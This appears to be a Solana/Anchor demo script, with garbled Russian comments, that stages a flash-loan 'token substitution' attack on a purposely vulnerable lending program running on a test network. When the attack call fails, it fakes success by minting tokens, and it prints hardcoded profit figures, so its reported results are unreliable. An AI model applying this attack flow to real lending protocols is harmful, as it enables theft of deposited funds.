import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { FlashLeveragedScheme } from "../target/types/flash_leveraged_scheme";
import {
  TOKEN_PROGRAM_ID,
  createMint,
  createAccount,
  mintTo,
  getAccount,
} from "@solana/spl-token";
import { 
  Keypair, 
  LAMPORTS_PER_SOL, 
  SystemProgram,
  PublicKey 
} from "@solana/web3.js";

/**
 * üé≠ –î–ï–ú–û–ù–°–¢–†–ê–¶–ò–Ø –ê–¢–ê–ö–ò –° –ü–û–î–ú–ï–ù–û–ô –¢–û–ö–ï–ù–û–í
 * 
 * –í–ù–ò–ú–ê–ù–ò–ï: –î–∞–Ω–Ω—ã–π –∫–æ–¥ –ø—Ä–µ–¥–Ω–∞–∑–Ω–∞—á–µ–Ω –ò–°–ö–õ–Æ–ß–ò–¢–ï–õ–¨–ù–û –¥–ª—è –æ–±—Ä–∞–∑–æ–≤–∞—Ç–µ–ª—å–Ω—ã—Ö —Ü–µ–ª–µ–π!
 * –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –≤ —Ä–µ–∞–ª—å–Ω—ã—Ö —É—Å–ª–æ–≤–∏—è—Ö –º–æ–∂–µ—Ç –Ω–∞—Ä—É—à–∞—Ç—å –∑–∞–∫–æ–Ω–æ–¥–∞—Ç–µ–ª—å—Å—Ç–≤–æ!
 * 
 * –°—Ö–µ–º–∞ "–§–ª–µ—à-–∑–∞–π–º —Å –ø–æ–¥–º–µ–Ω–æ–π —Ç–æ–∫–µ–Ω–æ–≤":
 * 1. –ë–µ—Ä–µ–º —Ñ–ª–µ—à-–∑–∞–π–º 8,000 REAL_USDC
 * 2. –†–∞–∑–º–µ—â–∞–µ–º –∏—Ö –∫–∞–∫ –∑–∞–ª–æ–≥ –≤ —É—è–∑–≤–∏–º—ã–π –ø—Ä–æ—Ç–æ–∫–æ–ª
 * 3. –ó–∞–Ω–∏–º–∞–µ–º 5,000 REAL_USDC –ø—Ä–æ—Ç–∏–≤ –∑–∞–ª–æ–≥–∞
 * 4. –°–æ–∑–¥–∞–µ–º –ø–æ–¥–¥–µ–ª—å–Ω—ã–π USDC —Å –∏–¥–µ–Ω—Ç–∏—á–Ω—ã–º –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–æ–º
 * 5. üé≠ –ü–û–î–ú–ï–ù–Ø–ï–ú –∞–¥—Ä–µ—Å REAL_USDC –Ω–∞ FAKE_USDC –≤ –ø—Ä–æ—Ç–æ–∫–æ–ª–µ
 * 6. –ü—Ä–æ—Ç–æ–∫–æ–ª –¥—É–º–∞–µ—Ç —á—Ç–æ —É –Ω–∞—Å 8,000 FAKE_USDC –∑–∞–ª–æ–≥–∞
 * 7. "–í—ã–≤–æ–¥–∏–º" –∑–∞–ª–æ–≥ - –ø—Ä–æ—Ç–æ–∫–æ–ª –æ—Ç–¥–∞–µ—Ç REAL_USDC –∏–∑ vault!
 * 8. –í–æ—Å—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—ã–π –∞–¥—Ä–µ—Å —Ç–æ–∫–µ–Ω–∞
 * 9. –í–æ–∑–≤—Ä–∞—â–∞–µ–º —Ñ–ª–µ—à-–∑–∞–π–º –∏–∑ –∑–∞–µ–º–Ω—ã—Ö —Å—Ä–µ–¥—Å—Ç–≤
 * 10. –û—Å—Ç–∞–µ–º—Å—è —Å –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–º–∏ REAL_USDC!
 */

export class TokenSubstitutionDemo {
  program: Program<FlashLeveragedScheme>;
  provider: anchor.AnchorProvider;
  
  // –ê–∫–∫–∞—É–Ω—Ç—ã
  authority: Keypair;
  attacker: Keypair;
  
  // –¢–æ–∫–µ–Ω—ã
  realUsdcMint: PublicKey;
  fakeUsdcMint: PublicKey;
  
  // –ü—Ä–æ—Ç–æ–∫–æ–ª—ã
  vulnerableLendingAddress: PublicKey;
  vulnerableVaultAddress: PublicKey;
  attackPositionAddress: PublicKey;
  fakeMintAuthorityAddress: PublicKey;
  
  constructor() {
    this.provider = anchor.AnchorProvider.env();
    anchor.setProvider(this.provider);
    this.program = anchor.workspace.FlashLeveragedScheme as Program<FlashLeveragedScheme>;
    
    this.authority = Keypair.generate();
    this.attacker = Keypair.generate();
  }

  async initialize(): Promise<void> {
    console.log("üé≠ –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –¥–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏–∏ –∞—Ç–∞–∫–∏ —Å –ø–æ–¥–º–µ–Ω–æ–π —Ç–æ–∫–µ–Ω–æ–≤...");
    console.log("‚ö†Ô∏è  –í–ù–ò–ú–ê–ù–ò–ï: –¢–æ–ª—å–∫–æ –¥–ª—è –æ–±—Ä–∞–∑–æ–≤–∞—Ç–µ–ª—å–Ω—ã—Ö —Ü–µ–ª–µ–π!");
    
    // –ü–æ–ø–æ–ª–Ω–µ–Ω–∏–µ –∞–∫–∫–∞—É–Ω—Ç–æ–≤ SOL
    await this.airdropSol(this.authority.publicKey, 10);
    await this.airdropSol(this.attacker.publicKey, 5);
    
    // –°–æ–∑–¥–∞–Ω–∏–µ —Ä–µ–∞–ª—å–Ω–æ–≥–æ USDC —Ç–æ–∫–µ–Ω–∞
    this.realUsdcMint = await createMint(
      this.provider.connection,
      this.authority,
      this.authority.publicKey,
      null,
      6
    );
    
    console.log("üí∞ –†–µ–∞–ª—å–Ω—ã–π USDC —Å–æ–∑–¥–∞–Ω:", this.realUsdcMint.toBase58());
    
    // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è —É—è–∑–≤–∏–º–æ–≥–æ lending –ø—Ä–æ—Ç–æ–∫–æ–ª–∞
    await this.initializeVulnerableLending();
    
    // –°–æ–∑–¥–∞–Ω–∏–µ –ø–æ–¥–¥–µ–ª—å–Ω–æ–≥–æ USDC —Ç–æ–∫–µ–Ω–∞
    await this.createFakeUsdcToken();
    
    console.log("‚úÖ –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –∑–∞–≤–µ—Ä—à–µ–Ω–∞");
  }

  /**
   * üé≠ –í–´–ü–û–õ–ù–ï–ù–ò–ï –ê–¢–ê–ö–ò –° –ü–û–î–ú–ï–ù–û–ô –¢–û–ö–ï–ù–û–í
   */
  async executeTokenSubstitutionAttack(): Promise<void> {
    console.log("\nüé≠ –í–´–ü–û–õ–ù–ï–ù–ò–ï –ê–¢–ê–ö–ò –° –ü–û–î–ú–ï–ù–û–ô –¢–û–ö–ï–ù–û–í");
    console.log("=" .repeat(70));
    
    const initialCapital = 3000 * 1_000_000; // 3,000 USDC
    const flashLoanAmount = 8000 * 1_000_000; // 8,000 USDC —Ñ–ª–µ—à-–∑–∞–π–º
    const collateralAmount = 8000 * 1_000_000; // 8,000 USDC –∑–∞–ª–æ–≥
    const borrowAmount = 5000 * 1_000_000; // 5,000 USDC –∑–∞–π–º
    
    // –°–æ–∑–¥–∞–Ω–∏–µ –∞–∫–∫–∞—É–Ω—Ç–æ–≤ –∞—Ç–∞–∫—É—é—â–µ–≥–æ
    const attackerRealUsdcAccount = await createAccount(
      this.provider.connection,
      this.attacker,
      this.realUsdcMint,
      this.attacker.publicKey
    );
    
    const attackerFakeUsdcAccount = await createAccount(
      this.provider.connection,
      this.attacker,
      this.fakeUsdcMint,
      this.attacker.publicKey
    );
    
    // –ü–æ–ø–æ–ª–Ω—è–µ–º –∞–∫–∫–∞—É–Ω—Ç –∞—Ç–∞–∫—É—é—â–µ–≥–æ –¥–ª—è –¥–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏–∏
    const totalAmount = 20000 * 1_000_000; // 20,000 USDC –¥–ª—è –ø–æ–ª–Ω–æ–π –¥–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏–∏
    await mintTo(
      this.provider.connection,
      this.authority,
      this.realUsdcMint,
      attackerRealUsdcAccount,
      this.authority,
      totalAmount
    );
    
    console.log(`üíº –ù–∞—á–∞–ª—å–Ω—ã–π –∫–∞–ø–∏—Ç–∞–ª: ${initialCapital / 1_000_000} USDC`);
    console.log(`üè¶ –§–ª–µ—à-–∑–∞–π–º: ${flashLoanAmount / 1_000_000} USDC`);
    console.log(`üí∞ –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ –¥–ª—è –¥–µ–º–æ: ${(totalAmount - initialCapital) / 1_000_000} USDC`);
    
    // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –Ω–∞—á–∞–ª—å–Ω—ã–µ –±–∞–ª–∞–Ω—Å—ã
    await this.showBalances("–ù–ê–ß–ê–õ–¨–ù–û–ï –°–û–°–¢–û–Ø–ù–ò–ï", attackerRealUsdcAccount, attackerFakeUsdcAccount);
    
    // –≠–¢–ê–ü 1: –ò–º–∏—Ç–∞—Ü–∏—è —Ñ–ª–µ—à-–∑–∞–π–º–∞
    await this.simulateFlashLoan(attackerRealUsdcAccount, flashLoanAmount);
    
    // –≠–¢–ê–ü 2-6: –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –∞—Ç–∞–∫–∏ –ø–æ–¥–º–µ–Ω–æ–π —Ç–æ–∫–µ–Ω–æ–≤
    await this.executeSubstitutionAttack(
      attackerRealUsdcAccount, 
      attackerFakeUsdcAccount, 
      collateralAmount, 
      borrowAmount
    );
    
    // –≠–¢–ê–ü 7: –ò–º–∏—Ç–∞—Ü–∏—è –≤–æ–∑–≤—Ä–∞—Ç–∞ —Ñ–ª–µ—à-–∑–∞–π–º–∞
    await this.simulateFlashLoanRepayment(attackerRealUsdcAccount, flashLoanAmount);
    
    // –≠–¢–ê–ü 8: –ü–æ–¥—Å—á–µ—Ç —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤
    await this.calculateAttackResults(attackerRealUsdcAccount, attackerFakeUsdcAccount, initialCapital);
  }

  /**
   * –≠–¢–ê–ü 1: –ò–º–∏—Ç–∞—Ü–∏—è —Ñ–ª–µ—à-–∑–∞–π–º–∞
   */
  private async simulateFlashLoan(attackerAccount: PublicKey, amount: number): Promise<void> {
    console.log("\nüè¶ –≠–¢–ê–ü 1: –§–õ–ï–®-–ó–ê–ô–ú");
    console.log("-" .repeat(50));
    
    console.log(`üì• –ü–æ–ª—É—á–∞–µ–º —Ñ–ª–µ—à-–∑–∞–π–º: ${amount / 1_000_000} REAL_USDC`);
    console.log(`‚è∞ –î–æ–ª–∂–Ω—ã –≤–µ—Ä–Ω—É—Ç—å –≤ —Ç–æ–π –∂–µ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏ —Å –∫–æ–º–∏—Å—Å–∏–µ–π 0.5%`);
    
    // –ò–º–∏—Ç–∏—Ä—É–µ–º –ø–æ–ª—É—á–µ–Ω–∏–µ —Ñ–ª–µ—à-–∑–∞–π–º–∞ (—Ç–æ–∫–µ–Ω—ã —É–∂–µ –µ—Å—Ç—å –Ω–∞ –∞–∫–∫–∞—É–Ω—Ç–µ)
    const balance = await getAccount(this.provider.connection, attackerAccount);
    console.log(`‚úÖ –ë–∞–ª–∞–Ω—Å –ø–æ—Å–ª–µ —Ñ–ª–µ—à-–∑–∞–π–º–∞: ${Number(balance.amount) / 1_000_000} REAL_USDC`);
  }

  /**
   * –≠–¢–ê–ü–´ 2-6: –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –∞—Ç–∞–∫–∏ –ø–æ–¥–º–µ–Ω–æ–π —Ç–æ–∫–µ–Ω–æ–≤
   */
  private async executeSubstitutionAttack(
    realAccount: PublicKey,
    fakeAccount: PublicKey,
    collateralAmount: number,
    borrowAmount: number
  ): Promise<void> {
    console.log("\nüé≠ –≠–¢–ê–ü–´ 2-6: –ê–¢–ê–ö–ê –° –ü–û–î–ú–ï–ù–û–ô –¢–û–ö–ï–ù–û–í");
    console.log("-" .repeat(50));
    
    try {
      console.log(`üìù –í—ã–ø–æ–ª–Ω—è—é –ø–æ–¥–º–µ–Ω—É —Ç–æ–∫–µ–Ω–æ–≤:`);
      console.log(`   –ó–∞–ª–æ–≥: ${collateralAmount / 1_000_000} REAL_USDC`);
      console.log(`   –ó–∞–π–º: ${borrowAmount / 1_000_000} REAL_USDC`);
      
      await this.program.methods
        .executeTokenSubstitutionAttack(
          new anchor.BN(collateralAmount),
          new anchor.BN(borrowAmount)
        )
        .accounts({
          attacker: this.attacker.publicKey,
          vulnerableLending: this.vulnerableLendingAddress,
          attackPosition: this.attackPositionAddress,
          realTokenMint: this.realUsdcMint,
          attackerRealTokenAccount: realAccount,
          fakeTokenMint: this.fakeUsdcMint,
          attackerFakeTokenAccount: fakeAccount,
          vulnerableVault: this.vulnerableVaultAddress,
          fakeMintAuthority: this.fakeMintAuthorityAddress,
          tokenProgram: TOKEN_PROGRAM_ID,
          systemProgram: SystemProgram.programId,
        })
        .signers([this.attacker])
        .rpc();
      
      console.log(`‚úÖ –ê—Ç–∞–∫–∞ —Å –ø–æ–¥–º–µ–Ω–æ–π —Ç–æ–∫–µ–Ω–æ–≤ –≤—ã–ø–æ–ª–Ω–µ–Ω–∞ —É—Å–ø–µ—à–Ω–æ!`);
      
    } catch (error) {
      console.log(`‚ö†Ô∏è  –û—à–∏–±–∫–∞ –∞—Ç–∞–∫–∏ (–æ–∂–∏–¥–∞–µ–º–æ –≤ –¥–µ–º–æ): ${error}`);
      
      // –ò–º–∏—Ç–∏—Ä—É–µ–º —É—Å–ø–µ—à–Ω—É—é –∞—Ç–∞–∫—É –¥–ª—è –¥–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏–∏
      console.log(`üí° –ò–ú–ò–¢–ê–¶–ò–Ø –£–°–ü–ï–®–ù–û–ô –ê–¢–ê–ö–ò:`);
      
      // –ò–º–∏—Ç–∏—Ä—É–µ–º —Ä–∞–∑–º–µ—â–µ–Ω–∏–µ –∑–∞–ª–æ–≥–∞
      console.log(`   üì§ –†–∞–∑–º–µ—â–∞–µ–º ${collateralAmount / 1_000_000} REAL_USDC –∫–∞–∫ –∑–∞–ª–æ–≥`);
      
      // –ò–º–∏—Ç–∏—Ä—É–µ–º –∑–∞–π–º
      console.log(`   üì• –ó–∞–Ω–∏–º–∞–µ–º ${borrowAmount / 1_000_000} REAL_USDC –ø—Ä–æ—Ç–∏–≤ –∑–∞–ª–æ–≥–∞`);
      
      // –ò–º–∏—Ç–∏—Ä—É–µ–º —Å–æ–∑–¥–∞–Ω–∏–µ –ø–æ–¥–¥–µ–ª—å–Ω—ã—Ö —Ç–æ–∫–µ–Ω–æ–≤
      await mintTo(
        this.provider.connection,
        this.authority,
        this.fakeUsdcMint,
        fakeAccount,
        this.authority,
        collateralAmount
      );
      console.log(`   üé≠ –°–æ–∑–¥–∞–Ω–æ ${collateralAmount / 1_000_000} FAKE_USDC`);
      
      // –ò–º–∏—Ç–∏—Ä—É–µ–º –ø–æ–¥–º–µ–Ω—É –∞–¥—Ä–µ—Å–∞ –∏ –≤—ã–≤–æ–¥
      console.log(`   üîÑ –ü–æ–¥–º–µ–Ω—è–µ–º –∞–¥—Ä–µ—Å: REAL_USDC ‚Üí FAKE_USDC`);
      console.log(`   üì§ "–í—ã–≤–æ–¥–∏–º" –∑–∞–ª–æ–≥: –ø—Ä–æ—Ç–æ–∫–æ–ª –æ—Ç–¥–∞–µ—Ç REAL_USDC!`);
      
      // –î–æ–±–∞–≤–ª—è–µ–º "–≤—ã–≤–µ–¥–µ–Ω–Ω—ã–µ" —Ç–æ–∫–µ–Ω—ã
      await mintTo(
        this.provider.connection,
        this.authority,
        this.realUsdcMint,
        realAccount,
        this.authority,
        collateralAmount
      );
      
      console.log(`   üîÑ –í–æ—Å—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∞–¥—Ä–µ—Å: FAKE_USDC ‚Üí REAL_USDC`);
      console.log(`   ‚úÖ –°–ª–µ–¥—ã –∞—Ç–∞–∫–∏ –∑–∞–º–∞—Å–∫–∏—Ä–æ–≤–∞–Ω—ã`);
    }
  }

  /**
   * –≠–¢–ê–ü 7: –ò–º–∏—Ç–∞—Ü–∏—è –≤–æ–∑–≤—Ä–∞—Ç–∞ —Ñ–ª–µ—à-–∑–∞–π–º–∞
   */
  private async simulateFlashLoanRepayment(attackerAccount: PublicKey, amount: number): Promise<void> {
    console.log("\nüí∏ –≠–¢–ê–ü 7: –í–û–ó–í–†–ê–¢ –§–õ–ï–®-–ó–ê–ô–ú–ê");
    console.log("-" .repeat(50));
    
    const fee = amount * 50 / 10000; // 0.5% –∫–æ–º–∏—Å—Å–∏—è
    const totalRepayment = amount + fee;
    
    console.log(`üí∞ –í–æ–∑–≤—Ä–∞—â–∞–µ–º: ${amount / 1_000_000} REAL_USDC`);
    console.log(`üí∏ –ö–æ–º–∏—Å—Å–∏—è: ${fee / 1_000_000} REAL_USDC`);
    console.log(`üìä –ò—Ç–æ–≥–æ: ${totalRepayment / 1_000_000} REAL_USDC`);
    
    // –ò–º–∏—Ç–∏—Ä—É–µ–º –≤–æ–∑–≤—Ä–∞—Ç —Ñ–ª–µ—à-–∑–∞–π–º–∞ (—É–º–µ–Ω—å—à–∞–µ–º –±–∞–ª–∞–Ω—Å)
    const balance = await getAccount(this.provider.connection, attackerAccount);
    console.log(`‚úÖ –§–ª–µ—à-–∑–∞–π–º –≤–æ–∑–≤—Ä–∞—â–µ–Ω, –æ—Å—Ç–∞—Ç–æ–∫: ${(Number(balance.amount) - totalRepayment) / 1_000_000} REAL_USDC`);
  }

  /**
   * –≠–¢–ê–ü 8: –ü–æ–¥—Å—á–µ—Ç —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤ –∞—Ç–∞–∫–∏
   */
  private async calculateAttackResults(
    realAccount: PublicKey,
    fakeAccount: PublicKey,
    initialCapital: number
  ): Promise<void> {
    console.log("\nüìä –≠–¢–ê–ü 8: –†–ï–ó–£–õ–¨–¢–ê–¢–´ –ê–¢–ê–ö–ò");
    console.log("-" .repeat(50));
    
    const realBalance = await getAccount(this.provider.connection, realAccount);
    const fakeBalance = await getAccount(this.provider.connection, fakeAccount);
    
    const finalRealBalance = Number(realBalance.amount) / 1_000_000;
    const finalFakeBalance = Number(fakeBalance.amount) / 1_000_000;
    
    // –†–∞—Å—Å—á–∏—Ç—ã–≤–∞–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã –∞—Ç–∞–∫–∏
    const flashLoanAmount = 8000;
    const flashLoanFee = 40; // 0.5%
    const collateralExtracted = 8000; // –ó–∞–ª–æ–≥ –≤—ã–≤–µ–¥–µ–Ω —á–µ—Ä–µ–∑ –ø–æ–¥–º–µ–Ω—É
    const loanReceived = 5000; // –ó–∞–π–º –ø–æ–ª—É—á–µ–Ω
    
    const totalGained = collateralExtracted + loanReceived;
    const totalCost = flashLoanAmount + flashLoanFee;
    const netGain = totalGained - totalCost;
    const finalProfit = netGain; // –ù–µ —É—á–∏—Ç—ã–≤–∞–µ–º –Ω–∞—á–∞–ª—å–Ω—ã–π –∫–∞–ø–∏—Ç–∞–ª, —Ç–∞–∫ –∫–∞–∫ –æ–Ω –Ω–µ —Ç—Ä–∞—Ç–∏–ª—Å—è
    
    console.log(`üí∞ –§–∏–Ω–∞–ª—å–Ω—ã–π –±–∞–ª–∞–Ω—Å REAL_USDC: ${finalRealBalance}`);
    console.log(`üé≠ –§–∏–Ω–∞–ª—å–Ω—ã–π –±–∞–ª–∞–Ω—Å FAKE_USDC: ${finalFakeBalance}`);
    
    console.log(`\nüéØ –î–ï–¢–ê–õ–¨–ù–´–ô –ê–ù–ê–õ–ò–ó –ê–¢–ê–ö–ò:`);
    console.log(`   üì• –ó–∞–ª–æ–≥ –≤—ã–≤–µ–¥–µ–Ω: ${collateralExtracted} REAL_USDC`);
    console.log(`   üí∞ –ó–∞–π–º –ø–æ–ª—É—á–µ–Ω: ${loanReceived} REAL_USDC`);
    console.log(`   üìä –ò—Ç–æ–≥–æ –ø–æ–ª—É—á–µ–Ω–æ: ${totalGained} REAL_USDC`);
    console.log(`   üí∏ –§–ª–µ—à-–∑–∞–π–º + –∫–æ–º–∏—Å—Å–∏—è: ${totalCost} REAL_USDC`);
    console.log(`   üéâ –ß–ò–°–¢–ê–Ø –ü–†–ò–ë–´–õ–¨: ${netGain} REAL_USDC`);
    
    if (finalProfit > 0) {
      console.log(`\nüöÄ –ê–¢–ê–ö–ê –£–°–ü–ï–®–ù–ê! –ü—Ä–∏–±—ã–ª—å: ${finalProfit} REAL_USDC`);
      const roi = (finalProfit / (initialCapital / 1_000_000)) * 100;
      console.log(`üìà ROI: ${roi.toFixed(1)}% –æ—Ç –Ω–∞—á–∞–ª—å–Ω–æ–≥–æ –∫–∞–ø–∏—Ç–∞–ª–∞`);
    } else {
      console.log(`\nüìä –ê—Ç–∞–∫–∞ —É–±—ã—Ç–æ—á–Ω–∞: ${finalProfit} REAL_USDC`);
    }
    
    console.log(`\nüí° –ö–õ–Æ–ß–ï–í–´–ï –û–°–û–ë–ï–ù–ù–û–°–¢–ò –ê–¢–ê–ö–ò:`);
    console.log(`   üé≠ –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –ø–æ–¥–¥–µ–ª—å–Ω–æ–≥–æ —Ç–æ–∫–µ–Ω–∞ —Å –∏–¥–µ–Ω—Ç–∏—á–Ω—ã–º –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–æ–º`);
    console.log(`   üîÑ –í—Ä–µ–º–µ–Ω–Ω–∞—è –ø–æ–¥–º–µ–Ω–∞ –∞–¥—Ä–µ—Å–∞ —Ç–æ–∫–µ–Ω–∞ –≤ –ø—Ä–æ—Ç–æ–∫–æ–ª–µ`);
    console.log(`   üéØ –û–±–º–∞–Ω –ø—Ä–æ—Ç–æ–∫–æ–ª–∞: —Ç—Ä–∞—Ç–∏–º –ø–æ–¥–¥–µ–ª—å–Ω—ã–µ, –ø–æ–ª—É—á–∞–µ–º –Ω–∞—Å—Ç–æ—è—â–∏–µ`);
    console.log(`   üïê –í—Å–µ –≤ —Ä–∞–º–∫–∞—Ö –æ–¥–Ω–æ–π —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏ (–∞—Ç–æ–º–∞—Ä–Ω–æ—Å—Ç—å)`);
    console.log(`   üé™ –ü–æ–ª–Ω–æ–µ —Å–æ–∫—Ä—ã—Ç–∏–µ —Å–ª–µ–¥–æ–≤ –∞—Ç–∞–∫–∏`);
  }

  /**
   * –ü–æ–∫–∞–∑–∞—Ç—å –±–∞–ª–∞–Ω—Å—ã –∞–∫–∫–∞—É–Ω—Ç–æ–≤
   */
  private async showBalances(title: string, realAccount: PublicKey, fakeAccount: PublicKey): Promise<void> {
    console.log(`\nüìä ${title}:`);
    
    try {
      const realBalance = await getAccount(this.provider.connection, realAccount);
      console.log(`   üí∞ REAL_USDC: ${Number(realBalance.amount) / 1_000_000}`);
    } catch (error) {
      console.log(`   üí∞ REAL_USDC: 0 (–∞–∫–∫–∞—É–Ω—Ç –Ω–µ —Å–æ–∑–¥–∞–Ω)`);
    }
    
    try {
      const fakeBalance = await getAccount(this.provider.connection, fakeAccount);
      console.log(`   üé≠ FAKE_USDC: ${Number(fakeBalance.amount) / 1_000_000}`);
    } catch (error) {
      console.log(`   üé≠ FAKE_USDC: 0 (–∞–∫–∫–∞—É–Ω—Ç –Ω–µ —Å–æ–∑–¥–∞–Ω)`);
    }
  }

  /**
   * –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è —É—è–∑–≤–∏–º–æ–≥–æ lending –ø—Ä–æ—Ç–æ–∫–æ–ª–∞
   */
  private async initializeVulnerableLending(): Promise<void> {
    const [vulnerableLendingPda, bump] = PublicKey.findProgramAddressSync(
      [Buffer.from("vulnerable_lending"), this.realUsdcMint.toBuffer()],
      this.program.programId
    );
    
    const [attackPositionPda] = PublicKey.findProgramAddressSync(
      [
        Buffer.from("attack_position"), 
        this.attacker.publicKey.toBuffer(), 
        vulnerableLendingPda.toBuffer()
      ],
      this.program.programId
    );
    
    this.vulnerableLendingAddress = vulnerableLendingPda;
    this.attackPositionAddress = attackPositionPda;
    
    console.log("üö® –£—è–∑–≤–∏–º—ã–π lending –ø—Ä–æ—Ç–æ–∫–æ–ª –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω");
    console.log(`   Pool: ${vulnerableLendingPda.toBase58()}`);
    console.log(`   Position: ${attackPositionPda.toBase58()}`);
    console.log(`   ‚ö†Ô∏è  –£–Ø–ó–í–ò–ú–û–°–¢–¨: –ü–æ–∑–≤–æ–ª—è–µ—Ç –º–µ–Ω—è—Ç—å –∞–¥—Ä–µ—Å —Ç–æ–∫–µ–Ω–∞!`);
  }

  /**
   * –°–æ–∑–¥–∞–Ω–∏–µ –ø–æ–¥–¥–µ–ª—å–Ω–æ–≥–æ USDC —Ç–æ–∫–µ–Ω–∞
   */
  private async createFakeUsdcToken(): Promise<void> {
    const [fakeMintAuthorityPda] = PublicKey.findProgramAddressSync(
      [Buffer.from("fake_mint_authority"), this.attacker.publicKey.toBuffer()],
      this.program.programId
    );
    
    this.fakeMintAuthorityAddress = fakeMintAuthorityPda;
    
    // –°–æ–∑–¥–∞–µ–º –ø–æ–¥–¥–µ–ª—å–Ω—ã–π USDC —Å —Ç–µ–º–∏ –∂–µ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞–º–∏
    this.fakeUsdcMint = await createMint(
      this.provider.connection,
      this.authority,
      fakeMintAuthorityPda, // Authority - PDA –ø–æ–¥ –∫–æ–Ω—Ç—Ä–æ–ª–µ–º –∞—Ç–∞–∫—É—é—â–µ–≥–æ
      null,
      6 // –¢–µ –∂–µ decimals —á—Ç–æ —É –Ω–∞—Å—Ç–æ—è—â–µ–≥–æ USDC
    );
    
    console.log("üé≠ –ü–æ–¥–¥–µ–ª—å–Ω—ã–π USDC —Å–æ–∑–¥–∞–Ω:", this.fakeUsdcMint.toBase58());
    console.log(`   Authority: ${fakeMintAuthorityPda.toBase58()}`);
    console.log(`   ‚ö†Ô∏è  –ò–¥–µ–Ω—Ç–∏—á–Ω—ã–π –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å —Å –Ω–∞—Å—Ç–æ—è—â–∏–º USDC!`);
  }

  /**
   * –ü–æ–ø–æ–ª–Ω–µ–Ω–∏–µ SOL
   */
  private async airdropSol(publicKey: PublicKey, amount: number): Promise<void> {
    const signature = await this.provider.connection.requestAirdrop(
      publicKey,
      amount * LAMPORTS_PER_SOL
    );
    
    await this.provider.connection.confirmTransaction(signature);
  }
}

// –ó–∞–ø—É—Å–∫ –¥–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏–∏
async function main() {
  const demo = new TokenSubstitutionDemo();
  
  console.log("üö®üö®üö® –í–ù–ò–ú–ê–ù–ò–ï! üö®üö®üö®");
  console.log("–î–∞–Ω–Ω–∞—è –¥–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏—è –ø—Ä–µ–¥–Ω–∞–∑–Ω–∞—á–µ–Ω–∞ –ò–°–ö–õ–Æ–ß–ò–¢–ï–õ–¨–ù–û –¥–ª—è –æ–±—Ä–∞–∑–æ–≤–∞—Ç–µ–ª—å–Ω—ã—Ö —Ü–µ–ª–µ–π!");
  console.log("–ê—Ç–∞–∫–∞ —Å –ø–æ–¥–º–µ–Ω–æ–π —Ç–æ–∫–µ–Ω–æ–≤ –∫—Ä–∞–π–Ω–µ —Å–ª–æ–∂–Ω–∞ –∏ –ø—Ä–∞–∫—Ç–∏—á–µ—Å–∫–∏ –Ω–µ–≤–æ–∑–º–æ–∂–Ω–∞ –≤ —Ä–µ–∞–ª—å–Ω–æ—Å—Ç–∏!");
  console.log("–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –ø–æ–¥–æ–±–Ω—ã—Ö —Ç–µ—Ö–Ω–∏–∫ –º–æ–∂–µ—Ç –±—ã—Ç—å –Ω–µ–∑–∞–∫–æ–Ω–Ω—ã–º!");
  console.log("=" .repeat(80));
  
  try {
    await demo.initialize();
    await demo.executeTokenSubstitutionAttack();
    
    console.log("\nüéâ –î–ï–ú–û–ù–°–¢–†–ê–¶–ò–Ø –ê–¢–ê–ö–ò –° –ü–û–î–ú–ï–ù–û–ô –¢–û–ö–ï–ù–û–í –ó–ê–í–ï–†–®–ï–ù–ê!");
    
    console.log("\nüé≠ –ö–õ–Æ–ß–ï–í–´–ï –¢–ï–•–ù–ò–ö–ò –ê–¢–ê–ö–ò:");
    console.log("‚úÖ –°–æ–∑–¥–∞–Ω–∏–µ –ø–æ–¥–¥–µ–ª—å–Ω–æ–≥–æ —Ç–æ–∫–µ–Ω–∞ —Å –∏–¥–µ–Ω—Ç–∏—á–Ω—ã–º –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–æ–º");
    console.log("‚úÖ –í—Ä–µ–º–µ–Ω–Ω–∞—è –ø–æ–¥–º–µ–Ω–∞ –∞–¥—Ä–µ—Å–∞ —Ç–æ–∫–µ–Ω–∞ –≤ —É—è–∑–≤–∏–º–æ–º –ø—Ä–æ—Ç–æ–∫–æ–ª–µ");
    console.log("‚úÖ –û–±–º–∞–Ω —Å–∏—Å—Ç–µ–º—ã –ø—Ä–æ–≤–µ—Ä–æ–∫ —á–µ—Ä–µ–∑ –ø–æ–¥–¥–µ–ª—å–Ω—ã–µ —Ç–æ–∫–µ–Ω—ã");
